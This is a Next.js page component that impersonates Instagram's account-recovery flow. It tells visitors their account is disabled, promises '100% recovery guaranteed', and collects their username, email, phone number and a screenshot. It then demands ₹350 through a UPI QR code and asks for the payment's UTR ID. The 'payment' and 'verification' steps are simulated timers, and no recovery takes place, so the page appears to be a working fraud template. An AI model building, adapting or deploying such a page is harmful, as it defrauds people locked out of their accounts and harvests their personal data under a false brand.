// app/recovery/page.js
"use client";

import { useState, useRef } from "react";
import { motion } from "framer-motion";
import Link from "next/link";
import {
  ArrowLeft,
  Camera,
  Mail,
  User,
  Phone,
  Upload,
  Clock,
  CreditCard,
  Copy,
} from "lucide-react";

export default function RecoveryPage() {
  // Step: 'form' | 'payment' | 'utr' | 'pending'
  const [step, setStep] = useState("form");
  const [formData, setFormData] = useState({
    username: "",
    email: "",
    phone: "",
    screenshot: null,
  });
  const [preview, setPreview] = useState(null);
  const [utrId, setUtrId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [copied, setCopied] = useState(false);
  const fileInputRef = useRef(null);

  // Handle form change
  const handleChange = (e) => {
    const { name, value, files } = e.target;
    if (name === "screenshot" && files && files[0]) {
      const file = files[0];
      setFormData((prev) => ({ ...prev, screenshot: file }));
      const reader = new FileReader();
      reader.onloadend = () => {
        setPreview(reader.result);
      };
      reader.readAsDataURL(file);
    } else {
      setFormData((prev) => ({ ...prev, [name]: value }));
    }
  };

  // Handle phone input: only digits, max 10
  const handlePhoneChange = (e) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 10);
    setFormData((prev) => ({ ...prev, phone: value }));
  };

  // Submit form -> go to payment with validation
  const handleSubmitForm = (e) => {
    e.preventDefault();

    // Validate username
    if (!formData.username.trim()) {
      alert("Please enter your username");
      return;
    }

    // Validate email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
      alert("Please enter a valid email address");
      return;
    }

    // Validate phone (exactly 10 digits)
    const phoneRegex = /^\d{10}$/;
    if (!phoneRegex.test(formData.phone)) {
      alert("Phone number must be exactly 10 digits");
      return;
    }

    // Validate screenshot
    if (!formData.screenshot) {
      alert("Please upload a screenshot of the disabled message");
      return;
    }

    // Store data
    const recoveryData = {
      id: "REC-" + Date.now().toString(36).toUpperCase(),
      ...formData,
      screenshot: preview || null,
      status: "Payment Pending",
      createdAt: new Date().toISOString(),
    };
    localStorage.setItem("recovery_request", JSON.stringify(recoveryData));
    setStep("payment");
  };

  // Simulate payment
  const handlePay = () => {
    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      const stored = JSON.parse(localStorage.getItem("recovery_request") || "{}");
      stored.status = "Paid";
      localStorage.setItem("recovery_request", JSON.stringify(stored));
      setStep("utr");
    }, 1500);
  };

  // Check UTR (must be 12 alphanumeric characters)
  const handleCheckUTR = () => {
    const utrRegex = /^[A-Za-z0-9]{12}$/;
    if (!utrId.trim()) {
      alert("Please enter UTR ID");
      return;
    }
    if (!utrRegex.test(utrId.trim())) {
      alert("UTR must be exactly 12 alphanumeric characters (e.g. ABC123XYZ789)");
      return;
    }
    setIsSubmitting(true);
    setTimeout(() => {
      setIsSubmitting(false);
      const stored = JSON.parse(localStorage.getItem("recovery_request") || "{}");
      stored.utr = utrId.trim();
      stored.status = "Pending Verification";
      localStorage.setItem("recovery_request", JSON.stringify(stored));
      setStep("pending");
    }, 1000);
  };

  // Copy UTR (if needed)
  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Reset everything (go back to form)
  const resetAll = () => {
    setStep("form");
    setFormData({ username: "", email: "", phone: "", screenshot: null });
    setPreview(null);
    setUtrId("");
    localStorage.removeItem("recovery_request");
  };

  return (
    <div className="min-h-screen bg-black text-white font-sans flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-white/5 backdrop-blur-sm border border-white/10 rounded-2xl p-6 shadow-2xl shadow-purple-500/10">
        {/* Back button & Instagram Logo */}
        <div className="flex items-center justify-between mb-6">
          <Link href="/" className="p-2 rounded-lg hover:bg-white/10 transition">
            <ArrowLeft className="w-5 h-5 text-gray-400" />
          </Link>
          <div className="flex items-center gap-2">
            <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center">
              <Camera className="w-5 h-5 text-white" />
            </div>
            <span className="text-xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
              Instagram
            </span>
          </div>
          <div className="w-8" />
        </div>

        {/* Heading */}
        <h1 className="text-2xl font-bold text-center">Account Disabled</h1>
        <p className="text-sm text-gray-400 text-center mt-1">
          Your account has been disabled. We can help you recover it.
        </p>
        <p className="text-xs text-emerald-400 text-center mt-2 bg-emerald-400/10 border border-emerald-400/20 rounded-lg p-2">
          🔒 Trusted words: We are here to assist you – 100% recovery guaranteed.
        </p>

        {/* ===== STEP 1: FORM ===== */}
        {step === "form" && (
          <motion.form
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mt-6 space-y-4"
            onSubmit={handleSubmitForm}
          >
            {/* Username */}
            <div>
              <label className="text-xs text-gray-400 block mb-1">Username</label>
              <div className="flex items-center bg-white/10 border border-white/10 rounded-lg px-3 py-2 focus-within:border-purple-500 transition">
                <User className="w-4 h-4 text-gray-400 mr-2" />
                <input
                  type="text"
                  name="username"
                  value={formData.username}
                  onChange={handleChange}
                  placeholder="@username"
                  className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500"
                  required
                />
              </div>
            </div>

            {/* Email */}
            <div>
              <label className="text-xs text-gray-400 block mb-1">Email Address</label>
              <div className="flex items-center bg-white/10 border border-white/10 rounded-lg px-3 py-2 focus-within:border-purple-500 transition">
                <Mail className="w-4 h-4 text-gray-400 mr-2" />
                <input
                  type="email"
                  name="email"
                  value={formData.email}
                  onChange={handleChange}
                  placeholder="your@email.com"
                  className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500"
                  required
                />
              </div>
            </div>

            {/* Phone Number - Only digits, max 10 */}
            <div>
              <label className="text-xs text-gray-400 block mb-1">Phone Number (10 digits)</label>
              <div className="flex items-center bg-white/10 border border-white/10 rounded-lg px-3 py-2 focus-within:border-purple-500 transition">
                <Phone className="w-4 h-4 text-gray-400 mr-2" />
                <input
                  type="text"
                  name="phone"
                  value={formData.phone}
                  onChange={handlePhoneChange}
                  placeholder="9876543210"
                  className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500"
                  maxLength="10"
                />
                <span className="text-xs text-gray-500">{formData.phone.length}/10</span>
              </div>
            </div>

            {/* Screenshot Upload */}
            <div>
              <label className="text-xs text-gray-400 block mb-1">
                Upload Screenshot (of disabled message)
              </label>
              <div
                onClick={() => fileInputRef.current.click()}
                className="flex flex-col items-center justify-center w-full p-4 bg-white/5 border-2 border-dashed border-white/20 rounded-lg cursor-pointer hover:border-purple-500 transition"
              >
                <Upload className="w-6 h-6 text-gray-400 mb-1" />
                <span className="text-xs text-gray-400">
                  {preview ? "✅ Screenshot uploaded" : "Click to upload"}
                </span>
                {preview && (
                  <img
                    src={preview}
                    alt="screenshot"
                    className="mt-2 w-20 h-20 object-cover rounded-lg border border-white/10"
                  />
                )}
                <input
                  type="file"
                  name="screenshot"
                  accept="image/*"
                  ref={fileInputRef}
                  onChange={handleChange}
                  className="hidden"
                  required
                />
              </div>
            </div>

            <button
              type="submit"
              className="w-full py-3 bg-gradient-to-r from-purple-500 to-pink-500 rounded-xl text-white font-semibold hover:shadow-lg hover:shadow-purple-500/30 transition"
            >
              Start Recovery Process
            </button>
          </motion.form>
        )}

        {/* ===== STEP 2: PAYMENT ===== */}
        {step === "payment" && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mt-6 space-y-4"
          >
            <div className="bg-white/5 p-4 rounded-xl border border-white/10">
              <div className="flex items-center gap-2 text-emerald-400 mb-2">
                <CreditCard className="w-5 h-5" />
                <span className="font-semibold">Payment Required</span>
              </div>
              <p className="text-sm text-gray-400">
                To initiate the recovery, please pay <span className="text-white font-bold">₹350</span>.
              </p>
              <div className="mt-4 flex justify-center">
                <div className="relative p-2 bg-white/5 rounded-xl border border-white/10 shadow-[0_0_30px_rgba(59,130,246,0.5)] shadow-white/20 hover:shadow-[0_0_50px_rgba(59,130,246,0.8)] transition-all duration-300">
                  <img
                    src="/scanner.jpeg"
                    alt="UPI QR Code"
                    className="w-40 h-40 object-contain rounded-lg"
                    onError={(e) => {
                      e.target.src =
                        "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='160' viewBox='0 0 160 160'%3E%3Crect fill='%23333' width='160' height='160'/%3E%3Ctext x='20' y='80' fill='%23aaa' font-size='14'%3EQR Code%3C/text%3E%3C/svg%3E";
                    }}
                  />
                </div>
              </div>
              <p className="text-xs text-center text-gray-500 mt-2">Scan to pay via UPI</p>
            </div>

            <button
              onClick={handlePay}
              disabled={isSubmitting}
              className="w-full py-3 bg-gradient-to-r from-emerald-500 to-teal-500 rounded-xl text-white font-semibold hover:shadow-lg hover:shadow-emerald-500/30 transition disabled:opacity-50"
            >
              {isSubmitting ? "Processing..." : "✅ Pay ₹350 Now"}
            </button>
          </motion.div>
        )}

        {/* ===== STEP 3: UTR ===== */}
        {step === "utr" && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mt-6 space-y-4"
          >
            <div className="bg-white/5 p-4 rounded-xl border border-white/10">
              <p className="text-sm text-emerald-400">✅ Payment successful!</p>
              <p className="text-xs text-gray-400 mt-1">
                Please enter the UTR ID (12 alphanumeric characters) you received after payment.
              </p>
            </div>

            <div className="flex items-center bg-white/10 border border-white/10 rounded-lg px-3 py-2 focus-within:border-purple-500 transition">
              <Copy className="w-4 h-4 text-gray-400 mr-2" />
              <input
                type="text"
                value={utrId}
                onChange={(e) => setUtrId(e.target.value.toUpperCase())}
                placeholder="e.g. ABC123XYZ789"
                className="bg-transparent outline-none w-full text-sm text-white placeholder-gray-500 uppercase"
                maxLength="12"
              />
              <span className="text-xs text-gray-500">{utrId.length}/12</span>
            </div>

            <button
              onClick={handleCheckUTR}
              disabled={isSubmitting}
              className="w-full py-3 bg-gradient-to-r from-purple-500 to-blue-500 rounded-xl text-white font-semibold hover:shadow-lg hover:shadow-purple-500/30 transition disabled:opacity-50"
            >
              {isSubmitting ? "Checking..." : "🔍 Check UTR"}
            </button>
          </motion.div>
        )}

        {/* ===== STEP 4: PENDING ===== */}
        {step === "pending" && (
          <motion.div
            initial={{ opacity: 0, y: 10 }}
            animate={{ opacity: 1, y: 0 }}
            className="mt-6 space-y-4 text-center"
          >
            <div className="flex justify-center">
              <Clock className="w-16 h-16 text-amber-400 animate-pulse" />
            </div>
            <h2 className="text-xl font-bold text-amber-400">Pending Verification</h2>
            <p className="text-sm text-gray-400">
              Your request has been received. Our team will verify your UTR and recover your account.
            </p>
            <div className="bg-white/5 p-4 rounded-xl border border-white/10 text-left space-y-1 text-xs">
              <p>
                <span className="text-gray-400">Request ID:</span>{" "}
                {JSON.parse(localStorage.getItem("recovery_request") || "{}").id || "N/A"}
              </p>
              <p>
                <span className="text-gray-400">UTR:</span>{" "}
                <span className="font-mono">{utrId}</span>
              </p>
              <p>
                <span className="text-gray-400">Status:</span>{" "}
                <span className="text-amber-400">Pending Verification</span>
              </p>
            </div>
            <button
              onClick={resetAll}
              className="w-full py-3 bg-white/10 border border-white/20 rounded-xl text-white font-semibold hover:bg-white/20 transition"
            >
              Submit Another Request
            </button>
          </motion.div>
        )}
      </div>
    </div>
  );
}